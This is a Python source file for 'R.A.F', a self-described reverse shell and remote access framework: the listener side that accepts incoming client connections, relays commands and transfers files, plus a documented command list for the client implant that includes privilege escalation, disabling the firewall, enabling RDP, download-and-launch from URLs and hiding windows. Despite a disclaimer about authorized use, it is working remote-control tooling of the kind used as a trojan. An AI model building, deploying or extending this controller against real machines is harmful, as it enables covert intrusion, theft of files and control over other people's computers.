#!/usr/bin/env python3

# # # # # # # # # # # # # # # # # # # # # # # # # # # # 
#	Name: R.A.F_[ Remote Access Framework ]			  #
#	Author: ThefixXxer [Managwu Ikenna Alfred]		  #
#	Description: R.A.F is a revershell built in       #
#				 python for standard remote-          #
#				 adminstation.  					  #
#				 									  #
# /This should work well on windows systems for now/  #
#													  #
# # # # # # # # # # # # # # # # # # # # # # # # # # # #

# # # # # # # # # # # # # # # # # # # # # # # # # # # # 
#  					  DISCLAMER:                      #
#					 ------------					  #
#  NOTE!!: R.A.F was not designed as a trojan rather  #
#	       a utility to aid in remote adminstration   #
#		   of PC the user is authorized to access.    #
#	 												  #
#  	Please stay legal.								  #
#                                    	 			  #
#	/Automatic Tower EXE compilation coming soon/ 	  #
#													  #
# # # # # # # # # # # # # # # # # # # # # # # # # # # #


import os
import sys
import time
import socket
import threading 
from queue import Queue
from struct import unpack
from termcolor import colored

#-----------------------GLOBAL PARAMETERS----------------------|
global drop                                                   #|
THREAD_COUNT= 2                                               #|
SESSION_ID= [1,2]                                             #|
queue= Queue()                                                #|
IP= colored(socket.gethostbyname(socket.gethostname()),'red') #|
HOSTNAME= colored(str(socket.gethostname()),'yellow')         #|
RAF= colored('R.A.F:~ > ','green')                            #|
at= colored('@', 'red')                                       #|
#HOSTNAME= colored(str(socket.gethostname()) # Use either of the two [IP or HOSTNAME] as your interactive_shell() prompt [ if you like ]
#IP= socket.gethostbyname(socket.gethostname()) #|                             


#----------Color Codex------------|
ERROR= colored('[-] ','red')     #|
SUCCESS= colored('[+] ','green') #|
NOTICE= colored('[!] ','yellow') #|
WAITING= colored('[?] ','blue')  #|
MAYBE= colored('[=] ','cyan')    #|
MAYBE2= colored(' [=]','cyan')   #|


#---------------------------------------------R.A.F_BANNER--------------------------------------------------|
def banner():                                                                                              #|
	print (             '                                                                  '         )     #|
	print (             '                                                                  '         )     #|
	print (             '                                                                  '         )     #|
	print (             '                                                                  '         )     #|
	print (             '                                                                  '         )     #|
	print (             '                                                                  '         )     #|
	print (colored(		' << ~| ==================================================== |~ >>', 'red'))       #|
	print (colored(		'{|} 	 _______              ______             ________      {|}', 'yellow'))    #|
	print (colored(		'(|)	|        \\           /      \\           |        |     (|)', 'green'))   #|
	print (colored(		'(|)	|    _   |   _      /   __   \\      _   |   _____|     (|)', 'green'))    #|
	print (colored(		'{|}	|   |+)  /  |_|    /   /+ \\   \\    |_|  |   |___       {|}', 'yellow'))  #|
	print (colored(		'(|)	|        \\        /   /__+_\\   \\        |    ___|      (|)', 'green'))  #|
	print (colored(		'(|)	|   | \\   \\      /   /      \\   \\       |   |          (|)', 'green')) #|
	print (colored(		'{|}	|   |  \\   \\    /   /        \\   \\      |   |          {|}', 'yellow'))#|
	print (colored(		'(|)	|___|   \\___\\  /___/          \\___\\     |___|          (|)', 'green')) #|
	print (colored(		'(|)	                                                       (|)', 'green'))     #|
	print (colored(		'{|}	                                                       {|}', 'yellow'))    #|
	print (colored(		' << ~| ==================================================== |~ >> ', 'red'))	   #|
	print (             '                                                                  '          )    #|
	print (colored(	   	'     |     Author              :  Managwu Ikenna Alfred     |     ', 'green'))    #|
	print (colored(	    '     |     Version             :  1.1.2                     |     ', 'green'))    #|
	print (colored(	    '     |     Codename            :  ThefixXxer                |     ', 'green'))    #|
	print (colored(	    '     |     Follow me on Github :  @ThefixXxer               |     ', 'green'))    #|
	print (colored(		'     |     R.A.F               :  Remote.Access.Framework   |     ', 'green'))    #|
	print (             '                                                                  '          )    #|
	print (colored(     '  <--========================================================-->  ', 'red'))      #|


#---------------------------------------------------COMMAND LISTS-----------------------------------------------------------|
COMMANDS = colored('''--------------------[ R.A.F_COMMAND_LIST ]--------------------


<|-|> help     : [ This will Shows this help list ]
<|-|>---------------------------------------------------------------------------------------------------
<|-|> clients  : [ This will list all your connected clients ]
<|-|>----------------------------------------------------------------------------------------------------
<|-|> interact : [ Selects a client by its number, Usage--> interact <client number>; E.g--> interact 0 ]
<|-|>----------------------------------------------------------------------------------------------------
<|-|> clear    : [ Clear R.A.F shell ]
<|-|>----------------------------------------------------------------------------------------------------
<|-|> exit     : [ Shuts server down ]

           ''','green')

'''------------------------------------------------[ CLIENT_INTERACTION_COMMANDS ]-----------------------------------------------------|
				  

|| pwd         : [ This will show you the client's current directory. ]                                                              
||                                                                                                                                   
|| copy        : [ To copy a file, only accepts files or directories, Usage--> 'copy <file/directory_name>  <destination_dirctory>' ]
||                                                                                                                                    
|| move        : [ To move a file or directory,  Usage--> 'move <file/directory_name>  <destination_dirctory>' ]
||
|| ls          : [ To view contents of Tower's current directory. ]
||
|| del         :  [ To delete a file or directory, Usage--> 'del <file/directory_name> ' ]
||
|| sysinfo     : [ This will display client machine information. ]
||
|| upload      : [ To upload files, Usage--> 'upload', then follow instruction. ]
||
|| download    : [ To download files, Usage--> 'download', then follow instruction. ]
||
|| quit        : [ Stops current connection with a client. To be used when interaction with a client is ongoing. ]
||
|| mkdir       : [ To create a directory[folder], Usage--> 'mkdir <name_of_folder> ' ]


//<-------------------- [ New ] --------------------->//


|| ps          : [ To list all runniing processes on client machine.]
||
|| clear       : [ Clear Tower shell. ]
||
|| kill        : [ To kill as process on client, Usage--> 'kill <PID>'. Get PID of process by using 'ps' ]
||
|| idle        : [ To get idle time of client. ]
||
|| reboot      : [ To reboot client machine. ]
||
|| shutdown    : [ To shutdown client machine. ]
||
|| hide        : [ To hide all windows on client machine. ]
||
|| uninstall   : [ This will uninstall a program from the client machine, Usage--> 'uninstall <program_name> ]
||
|| battery     : [ To view client battery info.]
||
|| users       : [ This will retrieve info on all users on client machine.]
||
|| pull        : [ To download file from url, Usage--> 'pull <file_url>' ]
||
|| pullnlaunch : [ To download and launch file fro url, Usage--> 'pullnlaunch <file_url> ]
||
|| rename      : [ To rename a file or directory on client machine, Usage--> 'rename <file_name>  <new_name>' ]
||
|| services    : [ This will display all running windows services on client. [Windows] ]
||
|| scan        : [ This will scan for open ports on client machine,
||    
||    Usage--> 'scan'[for client's port] OR 'scan <IP_address>'[for specific Ip] ]
||
|| rdp         : [ This will enable/disable remote desktop protocol on client machine[only when Tower is admin use 'escalate' first], 
||		
||    Usage-- > 'rdp  <activate>' OR 'rdp  <deactivate>' OR 'rdp  <status>' ]
||
|| firewall    : [ This will enable/disable network firewall on client machine[only when Tower is admin use 'escalate' first], 
||			 
||    Usage--> 'firewall  <activate>' OR 'firewall  <deactive>' OR 'firwall  <status>' ]
||
|| escalate    : [ This will attempt to grant Tower admin privilege on client [required for 'rdp' and 'firewall' commands to work] ]
||
|| launch      : [ To execute a file on client machine, Usage--> 'launch <file_name>' ]
||
|| programs    : [ To view all installed programs. NOTE!! THIS COMMAND TAKES A WHILE TO RUN. ]
||
|| visit 	   : [ This will open a url on the client default broswer, Usage--> 'visit <www.website.com>' ]

[ NOTE!!: Do not add the '<' '>' when passing input just your input and be sure to space command and input, i.e; 'launch file.exe'. ]

	  '''

#------------------------------CREATE CONNECTION TO CLIENTS------------------------------|
def create_connection():                                                                #|
	try:                                                                                #|
		global host                                                                     #|
		global LHOST                                                                    #|
		global LPORT                                                                    #|
		global socket                                                                   #|
                                                                                        #|
		LHOST= input(SUCCESS+'Set LHOST: ')                                             #|
		LPORT= input(SUCCESS+'Set LPORT: ')                                             #|
		host= LHOST+':'+str(LPORT)                                                      #|
		socket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)						#|
	except Exception as sok_Err:                                                        #|
		print (ERROR+'Socket creation error: '+str(sok_Err))                            #|
		print (ERROR+'Check create_connection(), Quitting....')                         #|
	#create_thread()                                                                    #|
                                                                                        #|
	#def socket_bind():                                                                 #|
	try:                                                                                #|
		print ('\n')                                                                    #|
		print (WAITING+'Binding socket to Host '+ str(host))                            #|
		socket.bind((LHOST,int(LPORT)))    												#|
		socket.listen(6)  																#|
		time.sleep(0.5)                                                                 #|
		print (SUCCESS+'Binding successful.')                                           #|
		time.sleep(0.7)                                                                 #|
		print (WAITING+'Waiting for connections.....')                                  #|
		accept_multi_connections()                                                      #|
	except Exception as sok_Err:                                                        #|
		print (ERROR+'Socket binding error: '+ str(sok_Err) + '\n\n\t' + 'Retrying...') #|	
	#socket_bind() # To recall the function if a socket bind error occurs. Recall limit has already been set to {6} so 6 retries.


#------------------------------------FOR SINGLE CLIENT CONNECTION------------------------------------|
def accept_connection():                                                                            #|
	try:                                                                                            #|
		conn, address= socket.accept() # Conn means the socket object being received and sent [the commands through the shell]
		print (SUCCESS+'Connection Established | IP: '+ address[0] + ' | Port: ' + str(address[1])) #| # address comes as a pair [list or tuple] says the socket documetation, ip & port hence the numbering, IP 1st value, Port 2nd, dont forget how index works when u see this. 
		send_command(conn)                                                                          #|
		conn.close() # Offcourse you have to close your connection to complete action.              #|
	except Exception as sok_Err:                                                                    #|
		print ('\n')                                                                                #|
		print (ERROR+'Failed to receive socket connection from target: '+str(sok_Err))              #|
# This function was not really used in this program, I used it to practice accepting connections with sockets. [JUST FOR TESTING].
# This function receives single threaded connections. Show this and hide accept_multi_connections to use. [DONT RUN THE TWO AT ONCE !!].


#--------------------------------ACCEPTS CLIENT CONNECTIONS-----------------------------|
def accept_multi_connections():                                                        #|
	global conn	                                                                       #|
	global clients                                                                     #|
	global client_address                                                              #|
                                                                                       #|
	clients= []                                                                        #|
	client_address= []                                                                 #|
	for connection in clients:                                                         #|
		connection.close() # This will close all connections each time the server runs, a way to ensure signal is constantly refreshed.
	#del clients[:]         # These two will clear out the client connection and address list every time server runs.
	#del client_address[:]                                                             #|
	#while 1:                                                                          #|
	try:                                                                               #|
		conn, address= socket.accept()                                                 #|
		conn.setblocking(1) # This sets blocking timeout to infinty. It works with the connection object[conn] not the whole socket
		clients.append(conn)                                                           #|    
		client_address.append(address)                                                 #|
		banner()                                                                       #|
		interactive_shell()                                                            #|
		conn.close() # Offcourse you have to close your connection to complete action. #|
	except Exception as sok_Err:                                                       #|
		print ('\n')                                                                   #|
		print (ERROR+'Failed to receive socket connection from target: '+str(sok_Err)) #|
		                                                                               #|

#----------------------------CLEAR TERMINAL--------------------------|
def clear_shell():                                                  #|
	try:                                                            #|
		if os.name== 'nt':                                          #|
			os.system('cls')                                        #|
			banner()                                                #|
		elif os.name== 'posix':                                     #|
			os.system('tput reset')                                 #|
	except Exception as clr_err:                                    #|
		print (ERROR+'unable to clear terminal: {}'.format(clr_err))#|


#--------------------------RECEIVE ALL DATA-------------------------|
def recv_aLL(ConN):                                                #|
	try:                                                           #|
		import socket as recv_aLL_sock                             #|
		from socket import socket as recv_SOCKE                    #|
                                                                   #|
		ConN.settimeout(None)                                      #|
		data = ConN.recv(999999)                                   #|
		ConN.settimeout(2)                                         #|
		while True:                                                #|
			try:                                                   #|
				tmp_data= ConN.recv(999999)                        #|
				if not tmp_data:                                   #|
					raise recv_aLL_sock.error                      #|
				data += tmp_data                                   #|
			except (recv_aLL_sock.error, recv_aLL_sock.timeout):   #|
				return data                                        #|
	except Exception as recv_aLL_err:                              #|
		print (ERROR+'Receive all error: {}'.format(recv_aLL_err)) #|


#--------------------------------------------------UPLOADS FILES--------------------------------------------------|
def upload():                                                                                                    #|
	try:                                                                                                         #|
		while True:                                                                                              #|
			conn.send(str.encode('upload'))                                                                      #|
			#print ('inside upload')                                                                             #|
			print (NOTICE+'Remember to add your file extension i.e[.exe], type the word "done" when your done.') #|
			print ('\n')                                                                                         #|
			file= input(SUCCESS+'Filename: ')                                                                    #|
			if file.strip() != 'done':                                                                           #|
				if os.path.isfile(file.strip()):                                                                 #|
					file_size= str(os.path.getsize(file))                                                        #|
					time.sleep(0.8)                                                                              #|
					print (NOTICE+'File size: '+str(file_size))                                                  #|
                                                                                                                 #|
					confirm= input(WAITING+'Continue? [y\\n]: ').lower()                                         #|
					print ('\n')                                                                                 #|
					if confirm.strip() in ('y', 'yes'):                                                          #|
						conn.send(str.encode(file_size))                                                         #|
                                                                                                                 #|
						conn.send(str.encode(file))                                                              #|
						try:                                                                                     #|
							#print (SUCCESS+'Reading file')                                                      #|
							byte= open(file, 'rb')                                                               #|
							try:                                                                                 #|
								print (WAITING+'Sending file: '+str(file))                                       #|
							except:                                                                              #|
								pass                                                                             #|
							try:      	                                                                         #|
								conn.sendfile(byte, 0)                                                           #|
							except Exception as e:                                                               #|
								print (ERROR+'Sendfile error: {}'.format(e))                                     #|
							try:                                                                                 #|
								time.sleep(1)                                                                    #|
								print (SUCCESS+'Sent %s successfully.'%file)                                     #|
								print ('\n')                                                                     #|
							except Exception as snd_fl_err1:                                                     #|
								print (ERROR+'Error: '+snd_fl_err1)                                              #|
								break                                                                            #|
							byte.close()                                                                         #|
                                                                                                                 #|
						except Exception as e:                                                                   #|
							print (ERROR+'Sendfile error: {}'.format(e))                                         #|
					elif confirm.strip() in ('n', 'no'):                                                         #|
						print (SUCCESS+'File: %s will not be sent.'%file)                                        #|
						break                                                                                    #|
				elif not os.path.isfile(file.strip()):                                                           #|
					print ('\n')                                                                                 #|
					print (ERROR+'No file named: '+file)                                                         #|
					break                                                                                        #|
			elif file.strip()== 'done':                                                                          #|
				conn.send(str.encode(file))                                                                      #|
				print ('\n')                                                                                     #|
				break                                                                                            #|
                                                                                                                 #|
	except Exception as snd_fl_err:                                                                              #|
		print ('\n')                                                                                             #|
		print (ERROR+'File upload_Error: '+ str(snd_fl_err))                                                     #|
		print ('\n')                                                                                             #|
		send_command(' ')                                                                                        #|

 
#------------------------------------------------DOWNLOADS FILES--------------------------------------------------|
def download():                                                                                                  #|
	try:                                                                                                         #|
		while True:                                                                                              #|
		    conn.send(str.encode('download'))     # You might have to take it back outside the loop.             #|
		    print (NOTICE+'Remember to add your file extension i.e[.exe], type the word "done" when your done.') #|
		    print ('\n')                                                                                         #|
		    file= input(SUCCESS+'Filename: ')                                                                    #|
		    if file.strip() != 'done':                                                                           #|
		    	conn.send(str.encode(file))                                                                      #|
		    	new= open('%s'%file, 'wb')                                                                       #|
                                                                                                                 #|
		    	file_S= conn.recv(1024)                                                                          #|
		    	try:                                                                                             #|
		    		file_size= int(file_S.decode('utf-8'))                                                       #|
		    		time.sleep(0.8)                                                                              #|
		    		print (NOTICE+'File size: '+str(file_size))                                                  #|
		    	except:                                                                                          #|
		    		print ('\n')                                                                                 #|
		    		print (ERROR+'Error: File size could not be established.')                                   #|
		    		print ('\n')                                                                                 #|
		    		conn.send(b'FILE ERROR')                                                                     #|
		    		break                                                                                        #|
		    	confirm= input(WAITING+'Continue? [y\\n]: ').lower()                                             #|
		    	print ('\n')                                                                                     #|
		    	if confirm.strip() in ('y', 'yes'):                                                              #|
		    		drop_size= 0                                                                                 #|
		    		print ('\n')                                                                                 #|
		    		print (WAITING+"Downloading file: "+file)                                                    #|
		    		while (True):                                                                                #|
		    			try:                                                                                     #|
		    				file_bytes = conn.recv(1024)                                                         #|
		    				drop_size= drop_size+len(file_bytes)                                                 #|
		    			except:                                                                                  #|
		    				pass                                                                                 #|
		    			new.write(file_bytes)                                                                    #|
		    			if drop_size >= file_size:                                                               #|
		    				break                                                                                #|
		    				new.close()                                                                          #|
		    		new.close()                                                                                  #|
		    		time.sleep(1)                                                                                #|
		    		print (SUCCESS+'Downloaded '+str(file)+' successfully.')                                     #|
		    		print ('\n')                                                                                 #|
		    	elif confirm.strip() in ('n', 'no'):                                                             #|
		    		print (SUCCESS+'File: %s will not be downloaded.'%file)                                      #|
		    		break                                                                                        #|
		    elif file.strip()== 'done':                                                                          #|
		    	conn.send(str.encode(file))                                                                      #|
		    	print ('\n')                                                                                     #|
		    	break                                                                                            #|
	except Exception as dnwld_fl_err:                                                                            #|
		print ('\n')                                                                                             #|
		print (ERROR+'File download_error: '+str(dnwld_fl_err))                                                  #|
		print ('\n')                                                                                             #|
		send_command(' ')                                                                                        #|


#-----------------------------------SEND COMMANDS----------------------------------|
def send_command(command):                                                        #|
	try:                                                                          #|
		inputs= 'quit', 'download', 'upload', 'clear'                             #|
		global incoming_bytes                                                     #|
		conn.send(str.encode(' '))                                                #|
		incoming_bytes= bytes.decode(conn.recv(20480), 'utf-8')                   #|
		print (NOTICE+'Enter "help" to view clients command list. ')              #|
		while True: # Because we want a continous send / receive relationship not a send once a die connection.
			try:                                                                  #|
				#drop= input(colored(incoming_bytes,'cyan'))                      #|
				drop= input(str(incoming_bytes))                                  #|
				print ('\n')                                                      #|
				if drop== 'quit':                                                 #|
					conn.send(str.encode(drop))                                   #|
					time.sleep(0.4)                                               #|
					client_gateway= bytes.decode(recv_aLL(conn), 'utf-8')         #|
					client_gateway= colored(client_gateway, 'magenta')            #|
					print (' '+SUCCESS+'Disconnecting client '+client_gateway)    #|
					conn.close()                                                  #|
					time.sleep(0.8)                                               #|
					interactive_shell()                                           #|
					break                                                         #|
				elif drop.strip()== 'download':                                   #|
					download()                                                    #|
				elif drop.strip()== 'upload':                                     #|
					upload()                                                      #|
				elif drop.strip()== 'clear':                                      #|
					clear_shell()                                                 #|
				elif drop.strip() not in inputs:                                  #|
					if len(str.encode(drop))> 0: # Check if a command is actually inserted not an empty line, dont waist resources.
						conn.send(str.encode(drop)) # When sending lines of commands across sockets, it is important to {ENCODE THE STRINGS TO BYTES} VERY IMPORTANT !!.
						incoming= recv_aLL(conn)                                  #|
						incoming= bytes.decode(incoming, 'utf-8') # Convert to string, and standard string format 'utf-8' for incoming.
						#incoming= bytes.decode(conn.recv(10000), 'utf-8')        #|
						print (incoming) # end here make sure when it returns line, it does not drop cursor down under the input, instead it stays on the same line [ONLY IN PYTHON 3].
						print ('\n')                                              #|
			except Exception as snd_cmd_Err:                                      #|
				print ('\n')                                                      #|
				print (' '+ERROR+'Something went wrong: '+str(snd_cmd_Err) )      #|
				print ('\n')                                                      #|
	except KeyboardInterrupt:                                                     #|
		print ('\n')                                                              #|
		ex_confirm=input(NOTICE+'Do you want to quit Tower connection? [y\\n]: ') #|
		ex_confirm = ex_confirm.lower()                                           #|
		if ex_confirm in ('y', 'yes'):                                            #|
			print ('\n')                                                          #|
			print (' '+SUCCESS+'Quitting Tower connection...')                    #|
			time.sleep(0.8)                                                       #|
			conn.send(str.encode('quit'))                                         #|
			client_gateway= bytes.decode(recv_aLL(conn), 'utf-8')                 #|
			client_gateway= colored(client_gateway, 'magenta')                    #|
			time.sleep(0.8)                                                       #|
			print (' '+SUCCESS+'Disconnecting client '+client_gateway)            #|
			time.sleep(0.8)                                                       #|
			print (' '+SUCCESS+'Returning to home...')                            #|
			time.sleep(0.8)                                                       #|
			banner()                                                              #|
			interactive_shell()                                                   #|
		elif ex_confirm in ('n', 'no'):                                           #|
			print ('\n')                                                          #|
			print (' '+SUCCESS+'Reconnecting Tower...')                           #|
			time.sleep(0.8)                                                       #|
			send_command(' ')                                                     #|


#--------------------------R.A.F_INTERACTION---------------------------|
def interactive_shell():                                              #|
	try:                                                              #|
		inputs= 'help', 'clear', 'clients', 'exit', 'shutdown'        #|
		print (COMMANDS)                                              #|
		while True:                                                   #|
			time.sleep(0.5)                                           #|
			global drop                                               #|
			drop= input(str(HOSTNAME)+at+RAF)                         #|
			if drop== 'help'.strip():                                 #|
				print (COMMANDS)                                      #|
	                                                                  #|
			elif drop.strip()== 'clients':                            #|
				list_clients()                                        #|
                                                                      #|
			elif drop.strip()== 'clear':                              #|
				clear_shell()                                         #|
	                                                                  #|
			elif drop.strip()== 'exit':					              #|
				socket.close() # Close the socket itself [kill the connection].
				print ('\n')                                          #|
				print ('\n')                                          #|
				print (' '+SUCCESS+'Exiting R.A.F...')                #|
				time.sleep(0.8)                                       #|
				sys.exit() # Exit the interactive shell               #|
	                                                                  #|
			elif 'interact' in drop:                                  #|
				session, conn= choose_client(drop) # Call choose_client() and assign it drop[command input] as an argument, then assign choose_client() to sessions variable.
				if session!= 0:	                                      #|
					try:                                              #|
						send_command(session) # If session[choose_client() function evaluates True[!=0], then pass it into send_command() u can also use [is not None] or [=True] or just leave it as [if session:]
					except Exception as e:                            #|
						print (e)                                     #|
				else:                                                 #|
					pass                                              #|
	                                                                  #|
			elif drop.strip() not in inputs:                          #|
				if len(drop)> 0:                                      #|
					print ('\n')                                      #|
					print (ERROR+'Command not recognized')            #|
					print ('\n')                                      #|
					continue # To jump back to the top of the loop.   #|
				elif len(drop)== 0:                                   #|
					print ('\n')                                      #|
					print (' '+ERROR+'Nulled byte input' )            #|
					print ('\n')                                      #|
					continue                                          #|
	except KeyboardInterrupt:                                         #|
		print ('\n')                                                  #|
		ex_confirm=input(NOTICE+'Do you want to exit R.A.F? [y\\n]: ')#|
		ex_confirm = ex_confirm.lower()                               #|
		if ex_confirm in ('y', 'yes'):                                #|
			print ('\n')                                              #|
			print (' '+SUCCESS+'Exiting R.A.F...')                    #|
			time.sleep(0.8)                                           #|
			sys.exit() # Exit the interactive shell                   #|
		elif ex_confirm in ('n', 'no'):                               #|
			print ('\n')                                              #|
			print (' '+SUCCESS+'Returning to home...')                #|
			time.sleep(0.8)                                           #|
			banner()                                                  #|
			interactive_shell()                                       #|


#---------------------------------------------------------------------------LIST ALL CONNECTED CLIENTS----------------------------------------------------------------------------------------|
def list_clients():                                                                                                                                                                          #|
	try:                                                                                                                                                                                     #|
		active_clients= ''                                                                                                                                                                   #|
		for num, conn in enumerate(clients):   														                                                                                         #|
			try:                                                                                                                                                                             #|
				conn.send(str.encode('  '))  # This an empty nulled bytes signal sent just to make sure client is online.                                                                    #|
				conn.recv(20480) # Received bytes to proof verify connection.                                                                                                                #|
			except Exception:                                                                                                                                                                #|
				print ('\n'+ str(num)+'  '+str(client_address[num][0])+' : '+ str(client_address[num][1]+'\n'))                                                                              #|
				conn.close()                                                                                                                                                                 #|
                                                                                                                                                                                             #|
			active_clients+= str(num) +'   '+ str(client_address[num][0])+'    '+ str(client_address[num][1])                                                                                #|
                                                                                                                                                                                             #|
                                                                                                                                                                                             #|
		print ('\n\t[----------ACTIVE CLIENTS----------]'+'\n\n'+'n\\b'+'      '+'IP'+'       '+'PORT'+'\n'+'---'+'     '+'----'+'     '+'------'+'\n'+colored(active_clients,'green')+'\n') #|
	except Exception as clnt_lst_err:                                                                                                                                                        #|
		print ('\n')                                                                                                                                                                         #|
		print ('|------'+MAYBE+'No connected clients'+MAYBE2+'------|')                                                                                                                      #|
		#print ('|------[=] No connected clients [=]------|')                                                                                                                                #|
		print ('\n')                                                                                                                                                                         #|
		time.sleep(0.8)                                                                                                                                                                      #|
		interactive_shell()                                                                                                                                                                  #|


#------------------------------SELECT SPECIFIED CLIENT-------------------------------|
def choose_client(drop):                                                            #|
	try:                                                                            #|
		try:                                                                        #|
			target= drop.split(' ')[-1]                                             #|
			#target= drop.replace('interact ','') 							        #|
			target= int(target)                                                     #|
			conn= clients[target]                                                   #|
			print ('\n')                                                            #|
			print (SUCCESS+'Interacting with client: '+str(client_address[target])) #|
			print ('\n')                                                            #|
			try:                                                                    #|
			 send_command(' ')                                                      #|
			except Exception as e:                                                  #|
 				print (e)                                                           #|
		except Exception as clnt_sel_err:                                           #|
			#print (clnt_sel_err)                                                   #|
			#interactive_shell()                                                    #|
			pass                                                                    #|
                                                                                    #|
		return target, conn                                                         #|
	except Exception:                                                               #|
		print ('\n')                                                                #|
		print (ERROR+'Invalid client selection, check client ID [n\\b].')           #|
		list_clients()                                                              #|
		interactive_shell()                                                         #|
		return None                                                                 #|
                                                                                    #|
create_connection()                                                                 #|
#accept_multi_connections()                                                         #|


# So im having a little problem getting around the multithreading part, I tried to do thread and queue functions but things just kept breaking so I took them out, a little help would go a long way, Thanks.
